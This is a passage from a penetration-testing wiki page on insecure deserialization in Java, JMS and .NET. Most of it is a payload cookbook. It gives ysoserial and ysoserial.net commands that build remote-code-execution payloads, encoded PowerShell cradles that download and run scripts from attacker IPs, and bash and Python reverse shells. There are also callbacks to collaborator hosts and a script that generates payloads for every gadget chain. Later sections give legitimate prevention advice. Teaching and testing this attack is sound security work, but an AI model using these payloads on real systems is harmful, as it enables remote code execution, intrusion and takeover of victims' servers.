java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 <span class="hljs-string">&quot;cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a&quot;</span>
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 <span class="hljs-string">&quot;powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA&quot;</span>
<span class="hljs-comment">### In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString(&apos;http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a&apos;)</span>
<span class="hljs-comment">### To encode something in Base64 for Windows PS from linux you can use: echo -n &quot;&lt;PAYLOAD&gt;&quot; | iconv --to-code UTF-16LE | base64 -w0</span>
<span class="hljs-comment">## Reverse Shell</span>
<span class="hljs-comment">### Encoded: IEX(New-Object Net.WebClient).downloadString(&apos;http://192.168.1.4:8989/powercat.ps1&apos;)</span>
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 <span class="hljs-string">&quot;powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA&quot;</span>

<span class="hljs-comment">#PoC RCE in Linux</span>
<span class="hljs-comment">## Ping</span>
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 <span class="hljs-string">&quot;ping -c 5 192.168.1.4&quot;</span> &gt; payload 
<span class="hljs-comment">## Time</span>
<span class="hljs-comment">### Using time in bash I didn&apos;t notice any difference in the timing of the response</span>
<span class="hljs-comment">## Create file</span>
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 <span class="hljs-string">&quot;touch /tmp/pwn&quot;</span> &gt; payload
<span class="hljs-comment">## DNS request</span>
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 <span class="hljs-string">&quot;dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net&quot;</span>
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 <span class="hljs-string">&quot;nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net&quot;</span>
<span class="hljs-comment">## HTTP request (+DNS)</span>
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 <span class="hljs-string">&quot;curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net&quot;</span> &gt; payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 <span class="hljs-string">&quot;wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net&quot;</span>
<span class="hljs-comment">## Reverse shell</span>
<span class="hljs-comment">### Encoded: bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1</span>
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 <span class="hljs-string">&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}&quot;</span> | base64 -w0
<span class="hljs-comment">### Encoded: export RHOST=&quot;127.0.0.1&quot;;export RPORT=12345;python -c &apos;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&apos;</span>
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 <span class="hljs-string">&quot;bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}&quot;</span>

<span class="hljs-comment"># Base64 encode payload in base64</span>
base64 -w0 payload
</code></pre>
<p>When creating a payload for <strong>java.lang.Runtime.exec()</strong> you <strong>cannot use special characters</strong> like &quot;&gt;&quot; or &quot;|&quot; to redirect the output of an execution, &quot;$()&quot; to execute commands or even <strong>pass arguments</strong> to a command separated by <strong>spaces</strong> (you can do <code>echo -n &quot;hello world&quot;</code> but you can&apos;t do <code>python2 -c &apos;print &quot;Hello world&quot;&apos;</code>). In order to encode correctly the payload you could <a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank">use this webpage</a>.</p>
<p>Feel free to use the next script to create <strong>all the possible code execution</strong> payloads for Windows and Linux and then test them on the vulnerable web page:</p>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> base64

<span class="hljs-comment"># You may need to update the payloads</span>
payloads = [<span class="hljs-string">&apos;BeanShell1&apos;</span>, <span class="hljs-string">&apos;Clojure&apos;</span>, <span class="hljs-string">&apos;CommonsBeanutils1&apos;</span>, <span class="hljs-string">&apos;CommonsCollections1&apos;</span>, <span class="hljs-string">&apos;CommonsCollections2&apos;</span>, <span class="hljs-string">&apos;CommonsCollections3&apos;</span>, <span class="hljs-string">&apos;CommonsCollections4&apos;</span>, <span class="hljs-string">&apos;CommonsCollections5&apos;</span>, <span class="hljs-string">&apos;CommonsCollections6&apos;</span>, <span class="hljs-string">&apos;CommonsCollections7&apos;</span>, <span class="hljs-string">&apos;Groovy1&apos;</span>, <span class="hljs-string">&apos;Hibernate1&apos;</span>, <span class="hljs-string">&apos;Hibernate2&apos;</span>, <span class="hljs-string">&apos;JBossInterceptors1&apos;</span>, <span class="hljs-string">&apos;JRMPClient&apos;</span>, <span class="hljs-string">&apos;JSON1&apos;</span>, <span class="hljs-string">&apos;JavassistWeld1&apos;</span>, <span class="hljs-string">&apos;Jdk7u21&apos;</span>, <span class="hljs-string">&apos;MozillaRhino1&apos;</span>, <span class="hljs-string">&apos;MozillaRhino2&apos;</span>, <span class="hljs-string">&apos;Myfaces1&apos;</span>, <span class="hljs-string">&apos;Myfaces2&apos;</span>, <span class="hljs-string">&apos;ROME&apos;</span>, <span class="hljs-string">&apos;Spring1&apos;</span>, <span class="hljs-string">&apos;Spring2&apos;</span>, <span class="hljs-string">&apos;Vaadin1&apos;</span>, <span class="hljs-string">&apos;Wicket1&apos;</span>]
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">generate</span><span class="hljs-params">(name, cmd)</span>:</span>
    <span class="hljs-keyword">for</span> payload <span class="hljs-keyword">in</span> payloads:
        final = cmd.replace(<span class="hljs-string">&apos;REPLACE&apos;</span>, payload)
        <span class="hljs-keyword">print</span> <span class="hljs-string">&apos;Generating &apos;</span> + payload + <span class="hljs-string">&apos; for &apos;</span> + name + <span class="hljs-string">&apos;...&apos;</span>
        command = os.popen(<span class="hljs-string">&apos;java -jar ysoserial.jar &apos;</span> + payload + <span class="hljs-string">&apos; &quot;&apos;</span> + final + <span class="hljs-string">&apos;&quot;&apos;</span>)
        result = command.read()
        command.close()
        encoded = base64.b64encode(result)
        <span class="hljs-keyword">if</span> encoded != <span class="hljs-string">&quot;&quot;</span>:
            open(name + <span class="hljs-string">&apos;_intruder.txt&apos;</span>, <span class="hljs-string">&apos;a&apos;</span>).write(encoded + <span class="hljs-string">&apos;\n&apos;</span>)

generate(<span class="hljs-string">&apos;Windows&apos;</span>, <span class="hljs-string">&apos;ping -n 1 win.REPLACE.server.local&apos;</span>)
generate(<span class="hljs-string">&apos;Linux&apos;</span>, <span class="hljs-string">&apos;ping -c 1 nix.REPLACE.server.local&apos;</span>)
</code></pre>
<h4 id="serialkillerbypassgadgets">serialkillerbypassgadgets</h4>
<p>You can <strong>use</strong> <a href="https://github.com/pwntester/SerialKillerBypassGadgetCollection" target="_blank"><strong>https://github.com/pwntester/SerialKillerBypassGadgetCollection</strong></a> <strong>along with ysoserial to create more exploits</strong>. More information about this tool in the <strong>slides of the talk</strong> where the tool was presented: <a href="https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1" target="_blank">https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1</a></p>
<h4 id="marshalsec">marshalsec</h4>
<p>****<a href="https://github.com/mbechler/marshalsec" target="_blank"><strong>marshalsec</strong> </a>can be used to generate payloads to exploit different <strong>Json</strong> and <strong>Yml</strong> serialization libraries in Java.<br>In order to compile the project I needed to <strong>add</strong> this <strong>dependencies</strong> to <code>pom.xml</code>:</p>
<pre><code class="lang-markup">&lt;dependency&gt;
        &lt;groupId&gt;javax.activation&lt;/groupId&gt;
        &lt;artifactId&gt;activation&lt;/artifactId&gt;
        &lt;version&gt;1.1.1&lt;/version&gt;
&lt;/dependency&gt;

&lt;dependency&gt;
        &lt;groupId&gt;com.sun.jndi&lt;/groupId&gt;
        &lt;artifactId&gt;rmiregistry&lt;/artifactId&gt;
        &lt;version&gt;1.2.1&lt;/version&gt;
        &lt;type&gt;pom&lt;/type&gt;
&lt;/dependency&gt;
</code></pre>
<p><strong>Install maven</strong>, and <strong>compile</strong> the project:</p>
<pre><code class="lang-bash">sudo apt-get install maven
mvn clean package -DskipTests
</code></pre>
<h4 id="fastjson">FastJSON</h4>
<p>Read more about this Java JSON library: <a href="https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html" target="_blank">https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html</a></p>
<h3 id="labs">Labs</h3>
<ul>
<li>If you want to test some ysoserial payloads you can <strong>run this webapp</strong>: <a href="https://github.com/hvqzao/java-deserialize-webapp" target="_blank">https://github.com/hvqzao/java-deserialize-webapp</a></li>
<li><a href="https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/" target="_blank">https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/</a></li>
</ul>
<h3 id="why">Why</h3>
<p>Java LOVES sending serialized objects all over the place. For example:</p>
<ul>
<li>In <strong>HTTP requests</strong> &#x2013; Parameters, ViewState, Cookies, you name it.</li>
<li><strong>RMI</strong> &#x2013; The extensively used Java RMI protocol is 100% based on serialization</li>
<li><strong>RMI over HTTP</strong> &#x2013; Many Java thick client web apps use this &#x2013; again 100% serialized objects</li>
<li><strong>JMX</strong> &#x2013; Again, relies on serialized objects being shot over the wire</li>
<li><strong>Custom Protocols</strong> &#x2013; Sending an receiving raw Java objects is the norm &#x2013; which we&#x2019;ll see in some of the exploits to come</li>
</ul>
<h3 id="prevention">Prevention</h3>
<h4 id="transient-objects">Transient objects</h4>
<p>A class that implements <code>Serializable</code> can implement as <code>transient</code> any object inside the class that shouldn&apos;t be serializable. For example:</p>
<pre><code class="lang-java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">myAccount</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span>
</span>{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> <span class="hljs-keyword">double</span> profit; <span class="hljs-comment">// declared transient</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> <span class="hljs-keyword">double</span> margin; <span class="hljs-comment">// declared transient</span>
</code></pre>
<h4 id="avoid-serialization-of-a-class-that-need-to-implements-serializable">Avoid Serialization of a class that need to implements Serializable</h4>
<p>Some of your application objects may be forced to implement <code>Serializable</code> due to their hierarchy. To guarantee that your application objects can&apos;t be deserialized, a <code>readObject()</code> method should be declared (with a <code>final</code> modifier) which always throws an exception:</p>
<pre><code class="lang-java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> java.io.IOException </span>{
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> java.io.IOException(<span class="hljs-string">&quot;Cannot be deserialized&quot;</span>);
}
</code></pre>
<h4 id="check-deserialized-class-before-deserializing-it">Check deserialized class before deserializing it</h4>
<p>The <code>java.io.ObjectInputStream</code> class is used to deserialize objects. It&apos;s possible to harden its behavior by subclassing it. This is the best solution if:</p>
<ul>
<li>You can change the code that does the deserialization</li>
<li>You know what classes you expect to deserialize</li>
</ul>
<p>The general idea is to override <a href="https://docs.oracle.com/javase/7/docs/api/java/io/ObjectInputStream.html#resolveClass%28java.io.ObjectStreamClass%29" target="_blank"><code>ObjectInputStream.html#resolveClass()</code></a> in order to restrict which classes are allowed to be deserialized.</p>
<p>Because this call happens before a <code>readObject()</code> is called, you can be sure that no deserialization activity will occur unless the type is one that you wish to allow.</p>
<p>A simple example of this shown here, where the the <code>LookAheadObjectInputStream</code> class is guaranteed not to deserialize any other type besides the <code>Bicycle</code> class:</p>
<pre><code class="lang-java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LookAheadObjectInputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ObjectInputStream</span> </span>{

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">LookAheadObjectInputStream</span><span class="hljs-params">(InputStream inputStream)</span> <span class="hljs-keyword">throws</span> IOException </span>{
        <span class="hljs-keyword">super</span>(inputStream);
    }

    <span class="hljs-comment">/**
    * Only deserialize instances of our expected Bicycle class
    */</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException {
        <span class="hljs-keyword">if</span> (!desc.getName().equals(Bicycle.class.getName())) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvalidClassException(<span class="hljs-string">&quot;Unauthorized deserialization attempt&quot;</span>, desc.getName());
        }
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">super</span>.resolveClass(desc);
    }
}
</code></pre>
<p><strong>Harden All java.io.ObjectInputStream Usage with an Agent</strong></p>
<p> If you don&apos;t own the code or can&apos;t wait for a patch, using an agent to weave in hardening to <code>java.io.ObjectInputStream</code> is the best solution.<br>Using this approach you can only Blacklist known malicious types and not whitelist them as you don&apos;t know which object are being serialized.</p>
<p>To enable these agents, simply add a new JVM parameter:</p>
<pre><code class="lang-text">-javaagent:name-of-agent.jar
</code></pre>
<p>Example:  <a href="https://github.com/Contrast-Security-OSS/contrast-rO0" target="_blank">rO0 by Contrast Security</a></p>
<h3 id="references">References</h3>
<ul>
<li>Deserialization and ysoserial talk: <a href="http://frohoff.github.io/appseccali-marshalling-pickles/" target="_blank">http://frohoff.github.io/appseccali-marshalling-pickles/</a></li>
<li><a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/" target="_blank">https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/</a></li>
<li><a href="https://www.youtube.com/watch?v=VviY3O-euVQ" target="_blank">https://www.youtube.com/watch?v=VviY3O-euVQ</a></li>
<li>Talk about gadgetinspector: <a href="https://www.youtube.com/watch?v=wPbW6zQ52w8" target="_blank">https://www.youtube.com/watch?v=wPbW6zQ52w8</a> and slides: <a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf" target="_blank">https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf</a></li>
<li>Marshalsec paper: <a href="https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true" target="_blank">https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true</a></li>
<li><a href="https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr" target="_blank">https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr</a></li>
<li><a href="https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html" target="_blank">https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html</a></li>
<li><a href="https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html" target="_blank">https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html</a></li>
<li>Java and .Net JSON deserialization <strong>paper:</strong> <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf" target="_blank"><strong>https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf</strong></a><strong>,</strong> talk: <a href="https://www.youtube.com/watch?v=oUAeWhW5b8c" target="_blank">https://www.youtube.com/watch?v=oUAeWhW5b8c</a> and slides: <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf" target="_blank">https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf</a></li>
<li>Deserialziations CVEs: <a href="https://paper.seebug.org/123/" target="_blank">https://paper.seebug.org/123/</a></li>
</ul>
<h2 id="jms---java-message-service">JMS - Java Message Service</h2>
<blockquote>
<p>The <strong>Java Message Service</strong> (<strong>JMS</strong>) API is a Java message-oriented middleware API for sending messages between two or more clients. It is an implementation to handle the producer&#x2013;consumer problem. JMS is a part of the Java Platform, Enterprise Edition (Java EE), and was defined by a specification developed at Sun Microsystems, but which has since been guided by the Java Community Process. It is a messaging standard that allows application components based on Java EE to create, send, receive, and read messages. It allows the communication between different components of a distributed application to be loosely coupled, reliable, and asynchronous. (From <a href="https://en.wikipedia.org/wiki/Java_Message_Service" target="_blank">Wikipedia</a>).</p>
</blockquote>
<h3 id="products">Products</h3>
<p>There are several products using this middleware to send messages:</p>
<p><img src="../../.gitbook/assets/image%20%28288%29.png" alt=""></p>
<p><img src="../../.gitbook/assets/image%20%2850%29.png" alt=""></p>
<h3 id="exploitation">Exploitation</h3>
<p>So, basically there are a <strong>bunch of services using JMS on a dangerous way</strong>. Therefore, if you have <strong>enough privileges</strong> to send messages to this services (usually you will need valid credentials) you could be able to send <strong>malicious objects serialized that will be deserialized by the consumer/subscriber</strong>.<br>This means that in this exploitation all the <strong>clients that are going to use that message will get infected</strong>.</p>
<p>You should remember that even if a service is vulnerable (because it&apos;s insecurely deserializing user input) you still need to find valid gadgets to exploit the vulnerability. </p>
<p>The tool <a href="https://github.com/matthiaskaiser/jmet" target="_blank">JMET</a> was created to <strong>connect and attack this services sending several malicious objects serialized using known gadgets</strong>. These exploits will work if the service is still vulnerable and if any of the used gadgets is inside the vulnerable application.</p>
<h3 id="references">References</h3>
<ul>
<li>JMET talk: <a href="https://www.youtube.com/watch?v=0h8DWiOWGGA" target="_blank">https://www.youtube.com/watch?v=0h8DWiOWGGA</a></li>
<li>Slides: <a href="https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf" target="_blank">https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf</a></li>
</ul>
<h2 id="net">.Net</h2>
<p>.Net is similar to Java regarding how deserialization exploits work: The <strong>exploit</strong> will <strong>abuse gadgets</strong> that <strong>execute</strong> some interesting <strong>code when</strong> an object is <strong>deserialized</strong>.</p>
<h3 id="fingerprint">Fingerprint</h3>
<h4 id="whitebox">WhiteBox</h4>
<p>Search the source code for the following terms:</p>
<ol>
<li><code>TypeNameHandling</code></li>
<li><code>JavaScriptTypeResolver</code></li>
</ol>
<p>Look for any serializers where the type is set by a user controlled variable.</p>
<h4 id="blackbox">BlackBox</h4>
<p>You can search for the Base64 encoded string <strong>AAEAAAD/////</strong> or any other thing that <strong>may be deserialized</strong> in the back-end and that allows you to control the deserialized type<strong>.</strong> For example, a <strong>JSON</strong> or <strong>XML</strong> containing <code>TypeObject</code> or <code>$type</code>.</p>
<h3 id="ysoserialnet">ysoserial.net</h3>
<p>In this case you can use the tool <a href="https://github.com/pwntester/ysoserial.net" target="_blank"><strong>ysoserial.net</strong></a> in order to <strong>create the deserialization exploits</strong>. Once downloaded the git repository you should <strong>compile the tool</strong> using Visual Studio for example.</p>
<p>If you want to learn about <strong>how does ysoserial.net creates it&apos;s exploit</strong> you can <a href="basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.html"><strong>check this page where is explained the ObjectDataProvider gadget + ExpandedWrapper + Json.Net formatter</strong></a>.</p>
<p>The main options of <strong>ysoserial.net</strong> are: <strong><code>--gadget</code></strong>, <strong><code>--formatter</code></strong>, <strong><code>--output</code></strong> and <strong><code>--plugin</code>.</strong></p>
<ul>
<li><strong><code>--gadget</code></strong> used to indicate the gadget to abuse (indicate the class/function that will be abused during deserialization to execute commands).</li>
<li><strong><code>--formatter</code></strong>, used to indicated the method to serialized the exploit (you need to know which library is using the back-end to deserialize the payload and use the same to serialize it)</li>
<li><strong><code>--output</code></strong> used to indicate if you want the exploit in <strong>raw</strong> or <strong>base64</strong> encoded. <em>Note that <strong>ysoserial.net</strong> will <strong>encode</strong> the payload using <strong>UTF-16LE</strong> (encoding used by default on Windows) so if you get the raw and just encode it from a linux console you might have some <strong>encoding compatibility problems</strong> that will prevent the exploit from working properly (in HTB JSON box the payload worked in both UTF-16LE and ASCII but this doesn&apos;t mean it will always work).</em></li>
<li><strong><code>--plugin</code></strong> ysoserial.net supports plugins to craft <strong>exploits for specific frameworks</strong> like ViewState</li>
</ul>
<h4 id="more-ysoserialnet-parameters">More ysoserial.net parameters</h4>
<ul>
<li><code>--minify</code> will provide a <strong>smaller payload</strong> (if possible)</li>
<li><code>--raf -f Json.Net -c &quot;anything&quot;</code> This will indicate all the gadgets that can be used with a provided formatter (<code>Json.Net</code> in this case)</li>
<li><code>--sf xml</code> you can <strong>indicate a gadget</strong> (<code>-g</code>)and ysoserial.net will search for formatters containing &quot;xml&quot; (case insensitive)</li>
</ul>
<p><strong>ysoserial examples</strong> to create exploits:</p>
<pre><code class="lang-bash"><span class="hljs-comment">#Send ping</span>
ysoserial.exe -g ObjectDataProvider <span class="hljs-_">-f</span> Json.Net -c <span class="hljs-string">&quot;ping -n 5 10.10.14.44&quot;</span> -o base64

<span class="hljs-comment">#Timing</span>
<span class="hljs-comment">#I tried using ping and timeout but there wasn&apos;t any difference in the response timing from the web server</span>

<span class="hljs-comment">#DNS/HTTP request</span>
ysoserial.exe -g ObjectDataProvider <span class="hljs-_">-f</span> Json.Net -c <span class="hljs-string">&quot;nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net&quot;</span> -o base64
ysoserial.exe -g ObjectDataProvider <span class="hljs-_">-f</span> Json.Net -c <span class="hljs-string">&quot;certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a&quot;</span> -o base64

<span class="hljs-comment">#Reverse shell</span>
<span class="hljs-comment">##Create shell command in linux</span>
<span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;IEX(New-Object Net.WebClient).downloadString(&apos;http://10.10.14.44/shell.ps1&apos;)&quot;</span> | iconv  -t UTF-16LE | base64 -w0
<span class="hljs-comment">##Create exploit using the created B64 shellcode</span>
ysoserial.exe -g ObjectDataProvider <span class="hljs-_">-f</span> Json.Net -c <span class="hljs-string">&quot;powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=&quot;</span> -o base64
</code></pre>
<p><strong>ysoserial.net</strong> has also a <strong>very interesting parameter</strong> that helps to understand better how every exploit works: <code>--test</code><br>If you indicates this parameter <strong>ysoserial.net</strong> will <strong>try</strong> the <strong>exploit locally,</strong> so you can test if your payload will work correctly.<br>This parameter is helpful because if you review the code you will find chucks of code like the following one (from <a href="https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208" target="_blank">ObjectDataProviderGenerator.cs</a>):</p>
<pre><code class="lang-java">            <span class="hljs-keyword">if</span> (inputArgs.Test)
                {
                    <span class="hljs-keyword">try</span>
                    {
                        SerializersHelper.JsonNet_deserialize(payload);
                    }
                    <span class="hljs-keyword">catch</span> (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
</code></pre>
<p>This means that in order to test the exploit the code will call <a href="https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539" target="_blank">serializersHelper.JsonNet_deserialize</a></p>
<pre><code class="lang-java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> object <span class="hljs-title">JsonNet_deserialize</span><span class="hljs-params">(string str)</span>
    </span>{
        Object obj = JsonConvert.DeserializeObject&lt;Object&gt;(str, <span class="hljs-keyword">new</span> JsonSerializerSettings
        {
            TypeNameHandling = TypeNameHandling.Auto
        });
        <span class="hljs-keyword">return</span> obj;
    }
</code></pre>
<p>In the <strong>previous code is vulnerable to the exploit created</strong>. So if you find something similar in a .Net application it means that probably that application is vulnerable too.<br>Therefore the <strong><code>--test</code></strong> parameter allows us to understand <strong>which chunks of code are vulnerable</strong> to the desrialization exploit that <strong>ysoserial.net</strong> can create.</p>
<h3 id="viewstate">ViewState</h3>
<p>Take a look to <a href="exploiting-__viewstate-parameter.html">this POST about <strong>how to try to exploit the __ViewState parameter of .Net</strong> </a>to <strong>execute arbitrary code</strong>.</p>
<h3 id="prevention"><strong>Prevention</strong></h3>
<p>Don&apos;t allow the datastream to define the type of object that the stream will be deserialized to. You can prevent this by for example using the <code>DataContractSerializer</code> or <code>XmlSerializer</code> if at all possible.</p>
<p>Where <code>JSON.Net</code> is being used make sure the <code>TypeNameHandling</code> is only set to <code>None</code>.</p>
<pre><code class="lang-text">TypeNameHandling = TypeNameHandling.None
</code></pre>
<p>If <code>JavaScriptSerializer</code> is to be used then do not use it with a <code>JavaScriptTypeResolver</code>.</p>
<p>If you must deserialise data streams that define their own type, then restrict the types that are allowed to be deserialized. One should be aware that this is still risky as many native .Net types potentially dangerous in themselves. e.g.</p>
<pre><code class="lang-text">System.IO.FileInfo
</code></pre>
<p><code>FileInfo</code> objects that reference files actually on the server can when deserialized, change the properties of those files e.g. to read-only, creating a potential denial of service attack.</p>
<p>Even if you have limited the types that can be deserialised remember that some types have properties that are risky. <code>System.ComponentModel.DataAnnotations.ValidationException</code>, for example has a property <code>Value</code> of type <code>Object</code>. if this type is the type allowed for deserialization then an attacker can set the <code>Value</code> property to any object type they choose.</p>
<p>Attackers should be prevented from steering the type that will be instantiated. If this is possible then even <code>DataContractSerializer</code> or <code>XmlSerializer</code> can be subverted e.g.</p>
<pre><code class="lang-text">// Action below is dangerous if the attacker can change the data in the database
var typename = GetTransactionTypeFromDatabase();  

var serializer = new DataContractJsonSerializer(Type.GetType(typename));

var obj = serializer.ReadObject(ms);
</code></pre>
<p>Execution can occur within certain .Net types during deserialization. Creating a control such as the one shown below is ineffective.</p>
<pre><code class="lang-text">var suspectObject = myBinaryFormatter.Deserialize(untrustedData);

//Check below is too late! Execution may have already occurred.
if (suspectObject is SomeDangerousObjectType)
{
    //generate warnings and dispose of suspectObject
}
</code></pre>
<p>For <code>BinaryFormatter</code> and <code>JSON.Net</code> it is possible to create a safer form of white list control using a custom <code>SerializationBinder</code>.</p>
<p>Try to keep up-to-date on known .Net insecure deserialization gadgets and pay special attention where such types can be created by your deserialization processes. <strong>A deserializer can only instantiate types that it knows about</strong>.</p>
<p>Try to keep any code that might create potential gadgets separate from any code that has internet connectivity. As an example <code>System.Windows.Data.ObjectDataProvider</code> used in WPF applications is a known gadget that allows arbitrary method invocation. It would be risky to have this a reference to this assembly in a REST service project that deserializes untrusted data.</p>
<h3 id="references"><strong>References</strong></h3>
<ul>
